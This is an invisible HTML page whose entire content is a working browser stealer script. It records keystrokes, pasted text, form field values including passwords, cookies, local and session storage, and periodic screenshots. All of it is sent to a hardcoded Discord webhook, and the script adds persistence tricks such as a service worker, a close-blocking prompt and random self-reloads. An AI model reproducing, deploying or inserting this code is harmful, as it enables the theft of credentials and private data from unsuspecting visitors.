<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body{margin:0;background:#000;opacity:0;position:fixed;inset:0;z-index:-9999;overflow:hidden;}
    </style>
</head>
<body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
    const webhook = "https://discord.com/api/webhooks/1520935776152588399/s5XS6Edgv2rvUcnBAQIXg2XXqhxbd2pk-YkknYSvKWYg1eioTMV6_Iq8BXi3moO9mGY";
    
    let keylog = '';
    let active = true;

    function exfil(data, isFile = false) {
        if (!active) return;
        try {
            if (isFile) {
                const fd = new FormData();
                fd.append('file', data, `grab_${Date.now()}.png`);
                fetch(webhook, {method: 'POST', body: fd}).catch(() => {});
            } else {
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({content: data})
                }).catch(() => {});
            }
        } catch(e) {}
    }

    // Enhanced Keylogger
    document.addEventListener('keydown', e => {
        if (!active) return;
        const key = e.key.length > 1 ? `[${e.key}]` : e.key;
        keylog += key;
        if (keylog.length > 40) {
            exfil(`🔑 KEYS: ${keylog}\nUA: ${navigator.userAgent}\nURL: ${location.href}\nReferrer: ${document.referrer}`);
            keylog = '';
        }
    });

    // Paste Logger
    document.addEventListener('paste', e => {
        setTimeout(() => {
            const txt = (e.clipboardData || window.clipboardData || {}).getData('text') || 'unknown';
            exfil(`📋 PASTE: ${txt}\nUA: ${navigator.userAgent}\nURL: ${location.href}`);
        }, 100);
    });

    // Form Data Grabber (inputs, passwords, etc.)
    function grabForms() {
        const forms = [];
        document.querySelectorAll('input, textarea, select').forEach(el => {
            if (el.value && el.value.length > 2) {
                forms.push(`${el.type || 'field'}: ${el.name || el.id || 'unnamed'} = ${el.value}`);
            }
        });
        if (forms.length) exfil(`📝 FORM GRAB:\n${forms.join('\n')}\nURL: ${location.href}`);
    }
    setInterval(grabForms, 15000);

    // Cookies & LocalStorage Dump
    function dumpStorage() {
        let cookies = document.cookie || 'none';
        let local = JSON.stringify(localStorage) || 'none';
        let session = JSON.stringify(sessionStorage) || 'none';
        exfil(`🍪 COOKIES: ${cookies}\nLOCAL: ${local}\nSESSION: ${session}\nURL: ${location.href}`);
    }
    setTimeout(dumpStorage, 3000);

    // Screenshot Capture (improved, with error handling)
    async function captureScreenshot() {
        if (!active) return;
        try {
            const canvas = await html2canvas(document.documentElement, {
                scale: 0.65,
                useCORS: true,
                logging: false,
                allowTaint: true,
                ignoreElements: (el) => el.tagName === 'SCRIPT' || el.tagName === 'STYLE'
            });
            canvas.toBlob(blob => {
                exfil(blob, true);
            }, 'image/png');
        } catch(e) {
            exfil(`📸 SCREENSHOT FAILED: ${e.message}`);
        }
    }
    setInterval(captureScreenshot, 12000);
    setTimeout(captureScreenshot, 2000); // initial

    // Persistence & Anti-Close
    window.onbeforeunload = () => "Leave?";
    
    // Service Worker for background persistence (create sw.js separately)
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js').catch(() => {});
    }

    // Initial beacon + buffer flush
    setTimeout(() => exfil('✅ STEALER ACTIVE - FULLY LOADED'), 800);
    setInterval(() => {
        if (keylog) {
            exfil(`🔑 BUFFER: ${keylog}`);
            keylog = '';
        }
    }, 7000);

    // Extra: Periodically check visibility
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) captureScreenshot();
    });

    // Self-reload trick for persistence on some blockers
    setTimeout(() => {
        if (Math.random() > 0.7) location.reload();
    }, 45000);
</script>
</body>
</html>
